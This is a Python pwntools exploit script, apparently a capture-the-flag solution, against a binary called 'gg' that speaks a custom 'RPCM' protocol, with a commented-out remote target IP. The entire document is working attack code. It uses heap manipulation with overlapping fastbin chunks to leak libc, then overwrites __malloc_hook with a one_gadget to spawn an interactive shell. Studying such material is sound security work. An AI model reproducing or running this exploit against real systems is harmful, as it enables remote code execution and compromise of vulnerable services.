from pwn import *
context(os='linux',arch='amd64')

p=process('./gg',env={'LD_PRELOAD':'./libc-2.23.so'})
#p=remote('115.159.100.108',1337)
elf = ELF('./gg')
libc = ELF('./libc-2.23.so')
def sendpkg(msg,uid,rec=0,err=0):
	m = p32(3)[::-1] +p32(32)[::-1] +uid + p32(36)[::-1]+'20829e66-d66b-429c-8963-d4e4937003d6' + p32(len(msg))[::-1] + msg
	l = len(m)+8
	m = 'RPCM'+p32(l)[::-1]+m
	p.send(m)
	if err:
		p.recvuntil('Error in: ')
		return 
	if not rec:
		p.recvuntil('\xbe\xef',timeout=2)
	#	print p.recv()




def recpkg(uid):
	m=p32(2)[::-1] +p32(32)[::-1]+uid+ p32(36)[::-1]+'20829e66-d66b-429c-8963-d4e4937003d6'
	l = len(m)+8
	m = 'RPCM'+p32(l)[::-1]+m
	p.send(m)
	p.recvuntil('\xbe\xf2')




p.send('RPCM'+p32(12)[::-1]+p32(0)[::-1])
p.recvuntil('\xbe\xef')	
p.send('RPCM'+p32(12)[::-1]+p32(1)[::-1])
p.recvuntil('\x00\x00\x00\x20')
uid = p.recv(32)
off = 10



sendpkg('_GG_gG_Gg_',uid,1)

def allocate(size,content,offset=0):
	p.sendlineafter(">> ","1")
	if offset:
		p.sendlineafter("Size: ",str(offset))
	p.sendlineafter("Size: ",str(size))
	p.sendlineafter("Message: ",content)

def show(index):
	p.sendlineafter(">> ","2")
	p.sendlineafter("Index: ",str(index))

def delete(index):
	p.sendlineafter(">> ","3")
	p.sendlineafter("Index: ",str(index))

allocate(0x10,'aaa')#0

allocate(0x28,'aaa')#0

allocate(0x28,'aaa')#1
allocate(0x28,'aaa')#2

delete(2)
delete(3)

delete(1)

allocate(0x28,'',0x61)#0

allocate(0x28,'aaa')#1
allocate(0x28,'aaa')#2 == 0 overlap


allocate(0x28,'aaa')#3
allocate(0x58,'aaa')#4
allocate(0x58,'aaa',0x5b)#5
allocate(0x58,'aaa',0x5a)#6

delete(2)
delete(3)
delete(4)
delete(5)
delete(6)

allocate(0x30,'aaa')#1

show(1)
p.recvuntil(": ")
addr=u64(p.recv(6).ljust(8,'\0'))

libc_base=addr - (0x7fae21b49b98-0x7fae21785000)
print "libc_base",hex(libc_base)

system=libc_base+libc.symbols['system']
print "system",hex(system)

free_hook=libc_base+libc.symbols['__free_hook']
print "free_hook",hex(free_hook)


malloc_hook=libc_base + libc.symbols['__malloc_hook']

main_arena = malloc_hook+0x10

one_gadget=libc_base+0xf1147


allocate(0x28,'aaa')#2 == 0
allocate(0x28,'aaa')#3

delete(3)
delete(4)
delete(1)
allocate(0x28,p64(0x61))#0
allocate(0x28,'')#2
allocate(0x28,'')#3

allocate(0x58,'a')#4
delete(7)
delete(5)

delete(2)

allocate(0x30,'aaa',0x71)#1

allocate(0x58,'a'*0x28+p64(0x61)+p64(main_arena+8))#4
allocate(0x50,'a'*0x28+p64(0x51)+p64(main_arena+0x58)+p64(main_arena+0x58))#5
allocate(0x50,'\x00'*0x40+p64(malloc_hook-0x10))#6

allocate(0x50,p64(one_gadget))

delete(1)

p.sendlineafter(">> ","1")
p.sendlineafter("Size: ",str(0x10))

p.interactive()

